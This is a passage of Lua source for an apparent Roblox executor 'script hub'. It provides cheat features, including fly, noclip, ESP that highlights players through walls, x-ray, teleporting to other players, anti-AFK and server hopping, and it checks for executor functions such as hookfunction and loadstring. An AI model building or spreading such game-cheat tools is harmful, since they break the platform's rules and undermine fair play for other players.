	feature(mv, mvNext(), "Jump power", "Jump higher", setJump,
		{ min = 50, max = 300, value = cfg.jump, step = 1, onChange = function(v) cfg.jump = v remember("jump", v) end })
	ui.flySet = feature(mv, mvNext(), "Fly", "Joystick or WASD + UP / DOWN", setFly,
		{ min = 10, max = 200, value = cfg.fly, step = 1, onChange = function(v) cfg.fly = v remember("fly", v) end }, "fly")
	feature(mv, mvNext(), "Noclip", "Walk through walls", setNoclip, nil, "noclip")
	feature(mv, mvNext(), "Infinite jump", "Jump in mid-air (JUMP button on phones)", function(v)
		state.ijump = v
		refreshTouchControls()
		return v
	end)
	feature(mv, mvNext(), "Click teleport", "Ctrl + click to teleport there", function(v)
		state.clicktp = v
		return v
	end)
	ui.freezeSet = feature(mv, mvNext(), "Freeze", "Anchor your character in place", setFreeze)
	feature(mv, mvNext(), "Gravity", "Lower = floaty, higher = heavy", setGravity,
		{ min = 20, max = 400, value = cfg.gravity, step = 1, onChange = function(v) cfg.gravity = v remember("gravity", v) end })
	feature(mv, mvNext(), "Anti-void", "Teleport you back if you fall out of the map", setAntiVoid)


	-- World
	local wd, wdNext = makeSection(scroll, "World", 2)
	feature(wd, wdNext(), "Fullbright", "Remove darkness and fog", setFullbright)
	feature(wd, wdNext(), "Field of view", "Custom camera FOV", setFov,
		{ min = 40, max = 120, value = cfg.fov, step = 1, onChange = function(v) cfg.fov = v remember("fov", v) end })
	feature(wd, wdNext(), "Time of day", "Force the in-game clock (0-24)", setTime,
		{ min = 0, max = 24, value = cfg.tod, step = 0.5, onChange = function(v) cfg.tod = v remember("tod", v) end })
	feature(wd, wdNext(), "Infinite zoom", "Zoom the camera out as far as you want", setZoom)

	-- Utility
	local vs, vsNext = makeSection(scroll, "Visuals", 3)
	feature(vs, vsNext(), "ESP chams", "Highlight other players through walls (Roblox shows ~31 max)", setEsp)
	feature(vs, vsNext(), "ESP names", "Name + distance above other players", setEspNames)
	feature(vs, vsNext(), "X-ray", "Make map parts see-through", setXray)

	local ut, utNext = makeSection(scroll, "Utility", 4)
	local afkSet = feature(ut, utNext(), "Anti-AFK", "Do not get kicked for idling", function(v)
		state.antiafk = v
		return v
	end)
	afkSet(true)
	local rejoin = makeActionButton(ut, utNext(), "↻  Rejoin server")
	rejoin.MouseButton1Click:Connect(function()
		pcall(function()
			if #Players:GetPlayers() <= 1 then
				TeleportService:Teleport(game.PlaceId, player)
			else
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
			end
		end)
	end)
	local reset = makeActionButton(ut, utNext(), "☠  Reset character")
	reset.MouseButton1Click:Connect(function()
		local hum = getHum()
		if hum then hum.Health = 0 end
	end)
	local copyPos = makeActionButton(ut, utNext(), "📋  Copy my position")
	copyPos.MouseButton1Click:Connect(function()
		local root = getRoot()
		if root and setclipboard then
			local p = root.Position
			setclipboard(("Vector3.new(%.1f, %.1f, %.1f)"):format(p.X, p.Y, p.Z))
			copyPos.Text = "✔  Copied"
			task.delay(1.2, function() if copyPos.Parent then copyPos.Text = "📋  Copy my position" end end)
		end
	end)
	feature(ut, utNext(), "Auto-rejoin on disconnect", "Best effort: tries to teleport back if you get kicked", setAutoRejoin)


	-- ---------- Limpieza ----------
	local function cleanup()
		pcall(setWalk, false)
		pcall(setJump, false)
		pcall(stopFly)
		pcall(setNoclip, false)
		pcall(setFullbright, false)
		pcall(setFov, false)
		pcall(setGravity, false)
		pcall(setFreeze, false)
		pcall(setZoom, false)
		pcall(setTime, false)
		pcall(setXray, false)
		espOn, espNameOn = false, false
		pcall(refreshEsp)
		if espFolder then pcall(function() espFolder:Destroy() end) end
		state.antivoid, state.autorejoin = false, false
		state.ijump = false
		pcall(refreshTouchControls)
		for _, c in uconns do pcall(function() c:Disconnect() end) end
		table.clear(uconns)
		env.__UniversalCleanup = nil
		W.close()
	end
	env.__UniversalCleanup = cleanup

	table.insert(uconns, UserInputService.InputBegan:Connect(function(input, processed)
		if not processed and input.KeyCode == UNIVERSAL_TOGGLE_KEY and W.gui.Parent then
			W.gui.Enabled = not W.gui.Enabled
		end
	end))
	-- atajos (se activan en Settings > Universal hotkeys): F = fly, N = noclip, V = speed
	local hotkeyMap = { [Enum.KeyCode.F] = "fly", [Enum.KeyCode.N] = "noclip", [Enum.KeyCode.V] = "speed" }
	table.insert(uconns, UserInputService.InputBegan:Connect(function(input, processed)
		if processed or not settings.hotkeys or UserInputService:GetFocusedTextBox() then return end
		local key = hotkeyMap[input.KeyCode]
		if key and toggles[key] and W.gui.Enabled then toggles[key]() end
	end))
end

local UNIVERSAL = { name = "Universal Utility", run = launchUniversal }

-- ===================================================================
-- MUSICA (solo la oyes tu)
-- ===================================================================
-- ===================================================================
-- HERRAMIENTAS (servidor, espectar, rendimiento): estado a nivel de modulo
-- ===================================================================
local Tools = { boost = false, fx = {}, saved = {}, boostToken = 0, spectating = nil }

-- OJO: en este script "settings" es la tabla de ajustes del hub; la funcion global settings() se pide aparte
local function rbxSettings()
	local ok, st = pcall(function() return getfenv(0).settings() end)
	return ok and st or nil
end

function Tools.setBoost(v)
	if v == Tools.boost then return v end
	Tools.boost = v
	Tools.boostToken += 1
	local my = Tools.boostToken
	if v then
		Tools.saved = { shadows = Lighting.GlobalShadows }
		Lighting.GlobalShadows = false
		local st = rbxSettings()
		if st then
			pcall(function()
				Tools.saved.quality = st.Rendering.QualityLevel
				st.Rendering.QualityLevel = Enum.QualityLevel.Level01
			end)
		end
		pcall(function()
			local t = workspace.Terrain
			Tools.saved.wave = t.WaterWaveSize
			t.WaterWaveSize = 0
		end)
		task.spawn(function()
			local function kill(d)
				if d:IsA("ParticleEmitter") or d:IsA("Trail") or d:IsA("Smoke") or d:IsA("Fire")
					or d:IsA("Sparkles") or d:IsA("Beam") then
					if d.Enabled then
						Tools.fx[d] = true
						d.Enabled = false
					end
				end
			end
			for _, d in Lighting:GetChildren() do
				if d:IsA("BloomEffect") or d:IsA("BlurEffect") or d:IsA("SunRaysEffect") or d:IsA("DepthOfFieldEffect") then
					if d.Enabled then
						Tools.fx[d] = true
						d.Enabled = false
					end
				end
			end
			local n = 0
			for _, d in workspace:GetDescendants() do
				if my ~= Tools.boostToken then return end
				kill(d)
				n += 1
				if n % 400 == 0 then task.wait() end
			end
		end)
	else
		local s = Tools.saved or {}
		if s.shadows ~= nil then Lighting.GlobalShadows = s.shadows end
		if s.quality then
			local st = rbxSettings()
			if st then pcall(function() st.Rendering.QualityLevel = s.quality end) end
		end
		if s.wave ~= nil then pcall(function() workspace.Terrain.WaterWaveSize = s.wave end) end
		for inst in Tools.fx do
			if inst.Parent then pcall(function() inst.Enabled = true end) end
			Tools.fx[inst] = nil
		end
	end
	return v
end

function Tools.spectate(plr)
	local cam = workspace.CurrentCamera
	local hum = plr and plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
	if not (cam and hum) then return false end
	cam.CameraSubject = hum
	Tools.spectating = plr
	return true
end

function Tools.stopSpectate()
	local cam = workspace.CurrentCamera
	local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
	if cam and hum then cam.CameraSubject = hum end
	Tools.spectating = nil
end

-- lista de servidores publicos del juego (de menos a mas jugadores), sin el actual ni los llenos
function Tools.serverList()
	local url = ("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true"):format(game.PlaceId)
	local body, err = httpGet(url)
	if not body then return nil, err end
	local ok, data = pcall(function() return HttpService:JSONDecode(body) end)
	if not ok or type(data) ~= "table" or type(data.data) ~= "table" then return nil, "unexpected response from Roblox" end
	local out = {}
	for _, s in data.data do
		if type(s) == "table" and s.id ~= game.JobId and tonumber(s.playing) and tonumber(s.maxPlayers)
			and s.playing < s.maxPlayers then
			table.insert(out, s)
		end
	end
	return out
end

function Tools.hop(smallest)
	local list, err = Tools.serverList()
	if not list then return false, "could not read the server list (" .. tostring(err) .. ")" end
	if #list == 0 then return false, "no other servers found" end
	local pick = smallest and list[1] or list[math.random(#list)]
	local ok, e = pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId, pick.id, player) end)
	if not ok then return false, tostring(e) end
	return true, ("joining a server with %d players"):format(pick.playing)
end

local SoundService = game:GetService("SoundService")
local Music = { sound = nil, index = 0, name = nil, state = "idle", err = nil, token = 0 }

local function djb2(str)
	local h = 5381
	for i = 1, #str do h = (h * 33 + string.byte(str, i)) % 4294967296 end
	return ("%x"):format(h)
end

-- acepta: ID de audio de Roblox, rbxassetid://..., o enlace directo a un .mp3/.ogg
local function resolveAudio(src)
	src = (src or ""):gsub("^%s+", ""):gsub("%s+$", "")
	if src:match("^%d+$") then return "rbxassetid://" .. src end
	if src:match("^rbxassetid://") or src:match("^rbxasset://") then return src end
	if src:match("^https?://") then
		if not (writefile and getcustomasset) then
			return nil, "your executor can not play links (needs writefile + getcustomasset). Use a Roblox audio ID instead"
		end
		pcall(function()
			if makefolder and isfolder and not isfolder("ScriptHub_music") then makefolder("ScriptHub_music") end
		end)
		local file = "ScriptHub_music/" .. djb2(src) .. ".mp3"
		local cached = false
		pcall(function() cached = isfile and isfile(file) end)
		if not cached then
			local body, err = httpGet(src)
			if not body then return nil, "download failed: " .. tostring(err) end
			local ok = pcall(writefile, file, body)
			if not ok then return nil, "could not save the audio file" end
		end
		local ok, asset = pcall(getcustomasset, file)
		if ok and asset then return asset end
		return nil, "getcustomasset failed"
	end
	return nil, "enter a Roblox audio ID (numbers) or a direct link to an .mp3 / .ogg file"
end

local function ensureSound()
	if Music.sound and Music.sound.Parent then return Music.sound end
	local s = Instance.new("Sound")
	s.Name = "ScriptHubMusic"
	s.Volume = settings.volume
	s.Looped = settings.musicLoop
	s.Parent = SoundService
	s.Ended:Connect(function()
		if settings.musicLoop then return end
		if settings.autoNext and #settings.playlist > 1 and Music.index > 0 then
			Music.step(1)
		end
	end)
	Music.sound = s
	return s
end

function Music.play(track, index)
	Music.token += 1
	local token = Music.token
	Music.index = index or 0
	Music.name = track.name
	Music.state = "loading"
	Music.err = nil
	task.spawn(function()
		local asset, err = resolveAudio(track.source)
		if token ~= Music.token then return end
		if not asset then
			Music.state, Music.err = "error", tostring(err)
			return
		end
		local s = ensureSound()
		s:Stop()
		s.SoundId = asset
		s.Volume = settings.volume
		s.Looped = settings.musicLoop
		s:Play()
		local waited = 0
		while not s.IsLoaded and waited < 8 and token == Music.token do
			task.wait(0.2)
			waited += 0.2
		end
		if token ~= Music.token then return end
		if not s.IsLoaded then
			s:Stop()
			Music.state, Music.err = "error", "could not load this audio (invalid ID, private, or blocked by Roblox)"
			return
		end
		Music.state = "ready"
	end)
end

function Music.toggle()
	local s = Music.sound
	if not s or Music.state ~= "ready" then
		if Music.state ~= "loading" and #settings.playlist > 0 then
			Music.play(settings.playlist[1], 1)
		end
		return
	end
	if s.IsPlaying then s:Pause() elseif s.IsPaused then s:Resume() else s:Play() end
end

function Music.stop()
	if Music.state == "loading" then
		Music.token += 1
		Music.state = "idle"
	end
	if Music.sound then Music.sound:Stop() end
end

function Music.step(dir)
	local list = settings.playlist
	if #list == 0 then return end
	local i = Music.index + dir
	if settings.shuffle and #list > 1 and dir > 0 then
		repeat i = math.random(#list) until i ~= Music.index
	elseif i > #list then i = 1 elseif i < 1 then i = #list end
	Music.play(list[i], i)
end
function Music.next() Music.step(1) end
function Music.prev() Music.step(-1) end

function Music.setVolume(v)
	settings.volume = v
	if Music.sound then Music.sound.Volume = v end
end
function Music.setLoop(v)
	settings.musicLoop = v
	if Music.sound then Music.sound.Looped = v end
end
function Music.destroy()
	Music.token += 1
	if Music.sound then Music.sound:Destroy() Music.sound = nil end
	Music.state = "idle"
end

-- ===================================================================
-- HUB
-- ===================================================================
-- imagen de fondo propia: ID de Roblox o enlace directo a .png/.jpg
local function resolveImage(src)
	src = (src or ""):gsub("^%s+", ""):gsub("%s+$", "")
	if src:match("^%d+$") then return "rbxassetid://" .. src end
	if src:match("^rbxassetid://") or src:match("^rbxasset://") then return src end
	if src:match("^https?://") then
		if not (writefile and getcustomasset) then
			return nil, "your executor can not load links (needs writefile + getcustomasset). Use a Roblox image ID"
		end
		pcall(function()
			if makefolder and isfolder and not isfolder("ScriptHub_images") then makefolder("ScriptHub_images") end
		end)
		local lower = src:lower()
		local ext = lower:match("%.jpe?g") and "jpg" or "png"
		local file = "ScriptHub_images/" .. djb2(src) .. "." .. ext
		local cached = false
		pcall(function() cached = isfile and isfile(file) end)
		if not cached then
			local body, err = httpGet(src)
			if not body then return nil, "download failed: " .. tostring(err) end
			if not (body:sub(2, 4) == "PNG" or body:sub(1, 2) == "\255\216") then
				return nil, "the link did not return a PNG/JPG image"
			end
			if not pcall(writefile, file, body) then return nil, "could not save the image" end
		end
		local ok, asset = pcall(getcustomasset, file)
		if ok and asset then return asset end
		return nil, "getcustomasset failed"
	end
	return nil, "enter a Roblox image ID (numbers) or a direct link to a .png / .jpg"
end

local gameName = "Loading..."
task.spawn(function()
	local ok, info = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
	gameName = (ok and info and info.Name) or "Unknown game"
end)

local function matches(entry)
	for _, id in entry.gameIds or {} do
		if tonumber(id) == game.GameId then return true end
	end
	for _, id in entry.placeIds or {} do
		if tonumber(id) == game.PlaceId then return true end
	end
	return false
end

local currentEntry
for _, entry in GAMES do
	if matches(entry) then
		currentEntry = entry
		break
	end
end

-- convierte un script de un juego en una entrada ejecutable
local function scriptEntry(gameEntry, s)
	return { name = gameEntry.name .. " - " .. s.name, url = s.url, source = s.source }
end

-- imagen de un juego / script de GAMES: icon = ID, rbxassetid://ID, rbxthumb://... o link directo a .png/.jpg
-- devuelve (imagen_inmediata, link_a_descargar). Sin icon se usa el icono del juego (gameIds[1]).
local function iconSource(entry, s)
	local gameThumb = ("rbxthumb://type=GameIcon&id=%d&w=150&h=150"):format(((entry and entry.gameIds) or {})[1] or 0)
	local src = (s and s.icon) or (entry and entry.icon)
	if src ~= nil then
		src = tostring(src):gsub("^%s+", ""):gsub("%s+$", "")
		if src:match("^%d+$") then return ("rbxthumb://type=Asset&id=%s&w=150&h=150"):format(src) end
		if src:match("^rbx") then return src end
		if src:match("^https?://") then return gameThumb, src end
	end
	return gameThumb
end

local function loadIconInto(img, url)
	if not url then return end
	task.spawn(function()
		local asset = resolveImage(url)
		if asset and img.Parent then img.Image = asset end
	end)
end

local executorName = "Unknown executor"
if identifyexecutor then
	local ok, name = pcall(identifyexecutor)
	if ok and name then executorName = tostring(name) end
end

-- estado del buscador (se conserva al reconstruir la interfaz)
local SORTS = {
	{ "views", "Views" }, { "likeCount", "Likes" }, { "updatedAt", "Updated" },
	{ "createdAt", "Newest" }, { "accuracy", "Relevance" },
}
local S = {
	query = "", mode = "trending", sortIndex = 1,
	page = 1, totalPages = 1, results = {}, request = 0, loaded = false,
	filters = { verified = settings.verifiedOnly, free = false, nokey = false, universal = false, unpatched = false },
}

local STATUS_H, TABS_H = 34, 38
local currentHub
local function importSettings(text)
	local ok, data = pcall(function() return HttpService:JSONDecode(text) end)
	if not ok or type(data) ~= "table" then return false, "that is not valid settings JSON" end
	local n = 0
	for k, v in DEFAULTS do
		if data[k] ~= nil and type(data[k]) == type(v) then
			settings[k] = data[k]
			n += 1
		end
	end
	local function clean(list, key)
		local out = {}
		if type(list) == "table" then
			for _, item in list do
				if type(item) == "table" and type(item[key]) == "string" and item[key] ~= "" then
					table.insert(out, item)
				end
			end
		end
		return out
	end
	if type(data.favorites) == "table" then settings.favorites = clean(data.favorites, "slug") end
	if type(data.history) == "table" then settings.history = clean(data.history, "slug") end
	if type(data.playlist) == "table" then settings.playlist = clean(data.playlist, "source") end
	local L = SIZE_LIMITS
	settings.scale = math.clamp(settings.scale, 0.6, 1.4)
	settings.transparency = math.clamp(settings.transparency, 0, 0.6)
	settings.bgArtOpacity = math.clamp(settings.bgArtOpacity, 0, 1)
	settings.volume = math.clamp(settings.volume, 0, 1)
	settings.hubW = math.clamp(settings.hubW, L.hub.minW, L.hub.maxW)
	settings.hubH = math.clamp(settings.hubH, L.hub.minH, L.hub.maxH)
	settings.uniW = math.clamp(settings.uniW, L.uni.minW, L.uni.maxW)
	settings.uniH = math.clamp(settings.uniH, L.uni.minH, L.uni.maxH)
	local valid = false
	for _, p in PRESETS do
		if p.name == settings.preset then valid = true end
	end
	if not valid then settings.preset = DEFAULTS.preset end
	return true, n
end

local function exportSettings()
	if not setclipboard then return false end
	return (pcall(function() setclipboard(HttpService:JSONEncode(settings)) end))
end

-- pestana Tools (fuera de buildHub: Luau limita a 60 upvalues / 200 locales por funcion)
local function buildToolsTab(ctx)
	local toolsPage, hub, toast, conns, onTabSelected = ctx.toolsPage, ctx.hub, ctx.toast, ctx.conns, ctx.onTabSelected
	-- ====== TOOLS ======
	local function copyText(text, okMsg)
		if setclipboard then
			setclipboard(text)
			toast(okMsg or "Copied", C.green)
		else
			toast("This executor has no setclipboard", C.red)
		end
	end

	local function miniButton(row, text, x, color, fn)
		local b = new("TextButton", {
			Size = UDim2.fromOffset(42, 26), AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, x, 0.5, 0),
			BackgroundColor3 = color or C.accent, Text = text, TextColor3 = (color and Color3.new(1, 1, 1)) or C.onAccent,
			Font = Enum.Font.GothamBold, TextSize = 11, AutoButtonColor = false,
		}, row)
		round(b, 8)
		b.MouseButton1Click:Connect(fn)
		return b
	end

	local function textBox(parent, order, placeholder)
		local box = new("TextBox", {
			Size = UDim2.new(1, 0, 0, 32), BackgroundColor3 = C.card2, LayoutOrder = order,
			PlaceholderText = placeholder, PlaceholderColor3 = C.sub, Text = "", TextColor3 = C.text,
			Font = Enum.Font.Gotham, TextSize = 12, ClearTextOnFocus = false, TextXAlignment = Enum.TextXAlignment.Left,
		}, parent)
		round(box, 8)
		padding(box, 10, 0, 10, 0)
		return box
	end

	-- servidor
	local sv, svNext = makeSection(toolsPage, "Server", 1)
	label(sv, {
		Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, LayoutOrder = svNext(),
		TextSize = 11, TextColor3 = C.sub, TextWrapped = true, TextYAlignment = Enum.TextYAlignment.Top,
		Text = ("PlaceId %d  •  GameId %d\nJobId %s"):format(game.PlaceId, game.GameId, game.JobId ~= "" and game.JobId or "(studio)"),
	})
	local rejoinBtn = makeActionButton(sv, svNext(), "↻  Rejoin this server")
	rejoinBtn.MouseButton1Click:Connect(function()
		toast("Rejoining…", C.amber)
		pcall(function()
			if #Players:GetPlayers() <= 1 then
				TeleportService:Teleport(game.PlaceId, player)
			else
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
			end
		end)
	end)
	local hopBtn = makeActionButton(sv, svNext(), "⇄  Hop to a random server")
	hopBtn.MouseButton1Click:Connect(function()
		toast("Looking for servers…", C.amber)
		task.spawn(function()
			local ok, msg = Tools.hop(false)
			if currentHub and currentHub.toast then currentHub.toast(msg, ok and C.green or C.red) end
		end)
	end)
	local smallBtn = makeActionButton(sv, svNext(), "⇄  Hop to a small server")
	smallBtn.MouseButton1Click:Connect(function()
		toast("Looking for servers…", C.amber)
		task.spawn(function()
			local ok, msg = Tools.hop(true)
			if currentHub and currentHub.toast then currentHub.toast(msg, ok and C.green or C.red) end
		end)
	end)
	local joinBtn = makeActionButton(sv, svNext(), "📋  Copy join script for this server")
	joinBtn.MouseButton1Click:Connect(function()
		copyText(('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)'):format(game.PlaceId, game.JobId),
			"Join script copied")
	end)
	local infoBtn = makeActionButton(sv, svNext(), "📋  Copy server info")
	infoBtn.MouseButton1Click:Connect(function()
		copyText(("PlaceId: %d\nGameId: %d\nJobId: %s\nPlayers: %d/%d"):format(game.PlaceId, game.GameId, game.JobId,
			#Players:GetPlayers(), Players.MaxPlayers), "Server info copied")
	end)

	-- jugadores
	local pg, pgNext = makeSection(toolsPage, "Players", 2)
	local filterBox = textBox(pg, pgNext(), "Filter players…")
	local stopSpec = makeActionButton(pg, pgNext(), "Stop spectating")
	stopSpec.MouseButton1Click:Connect(function()
		Tools.stopSpectate()
		toast("Camera is back on you", C.green)
	end)
	local playerList = new("Frame", {
		Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, BackgroundTransparency = 1, LayoutOrder = pgNext(),
	}, pg)
	new("UIListLayout", { Padding = UDim.new(0, 6), SortOrder = Enum.SortOrder.LayoutOrder }, playerList)
	local function renderPlayers()
		if not hub.alive then return end
		clearChildren(playerList)
		local q = string.lower(filterBox.Text or "")
		local n = 0
		for _, plr in Players:GetPlayers() do
			if plr ~= player and (q == "" or string.find(string.lower(plr.Name), q, 1, true)
				or string.find(string.lower(plr.DisplayName), q, 1, true)) then
				n += 1
				if n > 40 then break end
				local row = new("Frame", { Size = UDim2.new(1, 0, 0, 40), BackgroundColor3 = C.card2, BorderSizePixel = 0, LayoutOrder = n }, playerList)
				round(row, 8)
				label(row, {
					Size = UDim2.new(1, -150, 1, 0), Position = UDim2.fromOffset(10, 0),
					Text = plr.DisplayName .. "  @" .. plr.Name, TextSize = 12, TextTruncate = Enum.TextTruncate.AtEnd,
				})
				miniButton(row, "TP", -98, nil, function()
					local me = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
					local th = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
					if me and th then
						me.CFrame = th.CFrame * CFrame.new(0, 0, 3)
						toast("Teleported to " .. plr.DisplayName, C.green)
					else
						toast("Can't reach that player", C.red)
					end
				end)
				miniButton(row, "View", -52, nil, function()
					if Tools.spectate(plr) then toast("Viewing " .. plr.DisplayName, C.green)
					else toast("Can't view that player", C.red) end
				end)
				miniButton(row, "Copy", -6, nil, function() copyText(plr.Name, "Copied @" .. plr.Name) end)
			end
		end
		if n == 0 then
			label(playerList, { Size = UDim2.new(1, 0, 0, 20), Text = "No other players found", TextSize = 11, TextColor3 = C.sub })
		end
	end
	table.insert(conns, filterBox:GetPropertyChangedSignal("Text"):Connect(renderPlayers))
	table.insert(conns, Players.PlayerAdded:Connect(function() task.wait(0.3) renderPlayers() end))
	table.insert(conns, Players.PlayerRemoving:Connect(function() task.defer(renderPlayers) end))

	-- waypoints (por juego)
	local wp, wpNext = makeSection(toolsPage, "Waypoints", 3)
	local wpName = textBox(wp, wpNext(), "Name for this spot (optional)")
	local saveWp = makeActionButton(wp, wpNext(), "Save current position")
	local wpList = new("Frame", {
		Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, BackgroundTransparency = 1, LayoutOrder = wpNext(),
	}, wp)
	new("UIListLayout", { Padding = UDim.new(0, 6), SortOrder = Enum.SortOrder.LayoutOrder }, wpList)
	local function wpStore()
		if type(settings.waypoints) ~= "table" or settings.waypoints == DEFAULTS.waypoints then settings.waypoints = {} end
		local key = tostring(game.PlaceId)
		if type(settings.waypoints[key]) ~= "table" then settings.waypoints[key] = {} end
		return settings.waypoints[key]
	end
	local renderWaypoints
	renderWaypoints = function()
		if not hub.alive then return end
		clearChildren(wpList)
		local list = wpStore()
		local shown = 0
		for i, w in list do
			if type(w) == "table" and tonumber(w.x) and tonumber(w.y) and tonumber(w.z) then
				shown += 1
				local row = new("Frame", { Size = UDim2.new(1, 0, 0, 40), BackgroundColor3 = C.card2, BorderSizePixel = 0, LayoutOrder = i }, wpList)
				round(row, 8)
				label(row, {
					Size = UDim2.new(1, -110, 1, 0), Position = UDim2.fromOffset(10, 0),
					Text = tostring(w.name), TextSize = 12, TextTruncate = Enum.TextTruncate.AtEnd,
				})
				miniButton(row, "TP", -52, nil, function()
					local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
					if root then
						root.CFrame = CFrame.new(tonumber(w.x), tonumber(w.y) + 3, tonumber(w.z))
						toast("Teleported to " .. tostring(w.name), C.green)
					else
						toast("No character", C.red)
					end
				end)
				miniButton(row, "Del", -6, C.red, function()
					table.remove(list, i)
					saveSettings()
					renderWaypoints()
				end)
			end
		end
		if shown == 0 then
			label(wpList, { Size = UDim2.new(1, 0, 0, 20), Text = "No saved spots in this game yet", TextSize = 11, TextColor3 = C.sub })
		end
	end
	saveWp.MouseButton1Click:Connect(function()
		local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
		if not root then return toast("No character", C.red) end
		local list = wpStore()
		if #list >= 30 then return toast("Max 30 spots per game", C.red) end
		local name = string.gsub(wpName.Text or "", "^%s+", "")
		name = string.gsub(name, "%s+$", "")
		if name == "" then name = "Spot " .. (#list + 1) end
		local p = root.Position
		table.insert(list, { name = name, x = p.X, y = p.Y, z = p.Z })
		wpName.Text = ""
		saveSettings()
		renderWaypoints()
		toast("Saved: " .. name, C.green)
	end)

	-- rendimiento
	local pf, pfNext = makeSection(toolsPage, "Performance", 4)
	local boostSet = makeFeature(pf, pfNext(), "FPS booster", "Shadows off, lowest quality, particles & effects off (reversible)", function(v)
		Tools.setBoost(v)
		toast(v and "FPS booster on" or "FPS booster off", C.green)
		return v
	end, nil, conns)
	boostSet(Tools.boost)

	-- ejecutor
	local ex, exNext = makeSection(toolsPage, "Executor", 5)
	local caps = {}
	for _, fname in { "loadstring", "request", "writefile", "readfile", "isfile", "getcustomasset", "setclipboard",
		"queue_on_teleport", "gethui", "firesignal", "fireclickdetector", "hookfunction" } do
		local ok, has = pcall(function() return env[fname] ~= nil or getfenv()[fname] ~= nil end)
		table.insert(caps, fname .. ((ok and has) and " ✔" or " ✘"))
	end
	label(ex, {
		Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, LayoutOrder = exNext(),
		TextSize = 11, TextColor3 = C.sub, TextWrapped = true, TextYAlignment = Enum.TextYAlignment.Top,
		Text = "Executor: " .. tostring(executorName) .. "\n" .. table.concat(caps, "   "),
	})
	local dbgBtn = makeActionButton(ex, exNext(), "📋  Copy debug info")
	dbgBtn.MouseButton1Click:Connect(function()
		copyText(("Executor: %s\nPlaceId: %d  GameId: %d\nJobId: %s\nPlayers: %d\nPreset: %s\nHub size: %dx%d\nSupported: %s"):format(
			tostring(executorName), game.PlaceId, game.GameId, game.JobId, #Players:GetPlayers(), settings.preset,
			settings.hubW, settings.hubH, table.concat(caps, ", ")), "Debug info copied")
	end)

	onTabSelected["Tools"] = function()
		renderPlayers()
		renderWaypoints()
	end

end

local K = {
	ACCENTS = ACCENTS,
	BACKGROUNDS = BACKGROUNDS,
	SORTS = SORTS,
	PRESETS = PRESETS,
	HUB_NAME = HUB_NAME,
	formatViews = formatViews,
	hashColor = hashColor,
	findByName = findByName,
	sequence = sequence,
	firstChar = firstChar,
	iconSource = iconSource,
	loadIconInto = loadIconInto,
	resolveImage = resolveImage,
	resolveCode = resolveCode,
	queryScripts = queryScripts,
	gradient = gradient,
	outline = outline,
	padding = padding,
	hover = hover,
	card = card,
	clearChildren = clearChildren,
	exportSettings = exportSettings,
	importSettings = importSettings,
	buildToolsTab = buildToolsTab,
	addHistory = addHistory,
	toggleFav = toggleFav,
	isFav = isFav,
	scriptEntry = scriptEntry,
}
local buildHub

local function destroyHub(instant)
	if not currentHub then return end
	local hub = currentHub
	currentHub = nil
	hub.alive = false
	for _, c in hub.conns do pcall(function() c:Disconnect() end) end
	if instant then hub.gui:Destroy() else hub.close() end
end

local function rebuild(tab)
	local pos = currentHub and currentHub.win.Position
	destroyHub(true)
	buildHub(true, tab, pos)
end

env.__HubCleanup = function()
	destroyHub(false)
	Music.destroy()
	pcall(Tools.setBoost, false)
	pcall(Tools.stopSpectate)
	env.__HubCleanup = nil
end

-- tecla de panico: cierra todo al instante (sin preguntar)
local function panicAll()
	pcall(function() local f = env.__UniversalCleanup if f then f() end end)
	pcall(function() local f = env.__HubCleanup if f then f() end end)
end

-- carga (sin bloquear) la imagen de fondo del preset activo, si el preset define una
local function loadPresetImage()
	presetAsset = nil
	local p = findByName(PRESETS, settings.preset)
	if p.imageUrl and p.imageUrl ~= "" then
		task.spawn(function()
			local asset = resolveImage(p.imageUrl)
			if asset and settings.preset == p.name then
				presetAsset = asset
				if currentHub then rebuild(currentHub.tab or "Home") end
			end
		end)
	end
end

buildHub = function(instant, startTab, startPos)
	local conns = {}
	local hub = { alive = true, conns = conns }

	local H = buildWindow({
		name = "ScriptHubGui",
		title = K.HUB_NAME,
		subtitle = "Game detection  •  ScriptBlox  •  Universal tools",
		icon = "S",
		width = settings.hubW,
		height = settings.hubH,
		minW = SIZE_LIMITS.hub.minW, minH = SIZE_LIMITS.hub.minH,
		maxW = SIZE_LIMITS.hub.maxW, maxH = SIZE_LIMITS.hub.maxH,
		defaultW = SIZE_LIMITS.hub.defaultW, defaultH = SIZE_LIMITS.hub.defaultH,
		onResize = function(w, h)
			settings.hubW, settings.hubH = w, h
			queueSave()
		end,
		position = startPos or UDim2.new(0.5, -settings.hubW / 2, 0.5, -settings.hubH / 2),
		order = 10,
		conns = conns,
		instant = instant,
		onClose = function() local f = env.__HubCleanup if f then f() end end,
		confirmClose = function() return settings.confirmClose end,
		confirmTitle = "Are you sure you want to close the hub?",
		confirmBody = "The hub window will close. Scripts you already ran keep running and your settings are saved.",
	})
	hub.gui, hub.win, hub.close = H.gui, H.win, H.close
	currentHub = hub

	-- ---------- barra de estado ----------
	local statusBar = new("Frame", {
		Size = UDim2.new(1, 0, 0, STATUS_H),
		Position = UDim2.new(0, 0, 1, -STATUS_H),
		BackgroundColor3 = C.card,
		BorderSizePixel = 0,
	}, H.content)
	new("Frame", { Size = UDim2.new(1, 0, 0, 1), BackgroundColor3 = C.line, BorderSizePixel = 0 }, statusBar)
	local statusDot = new("Frame", {
		Size = UDim2.fromOffset(8, 8),
		Position = UDim2.new(0, 14, 0.5, -4),
		BackgroundColor3 = C.green,
		BorderSizePixel = 0,
